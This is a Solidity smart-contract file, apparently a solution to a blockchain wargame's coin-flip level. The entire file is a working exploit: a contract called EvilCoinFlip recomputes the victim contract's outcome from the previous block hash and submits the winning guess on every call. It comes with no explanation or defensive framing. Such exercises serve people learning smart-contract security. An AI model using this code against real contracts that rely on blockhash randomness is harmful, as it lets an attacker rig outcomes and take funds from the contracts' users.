// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Victim {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external returns (uint);
}

contract EvilCoinFlip {
    address public victimAddr;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //0xB77adf252Fa2deD8B3F3c8Ce913b65FdF77E56D6
    function setVictimAddress(address _victimAddr) public {
        victimAddr = _victimAddr;
    }

    function hackFlip(bool _guess) public {
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            Victim(victimAddr).flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            Victim(victimAddr).flip(!_guess);
        }
    }
}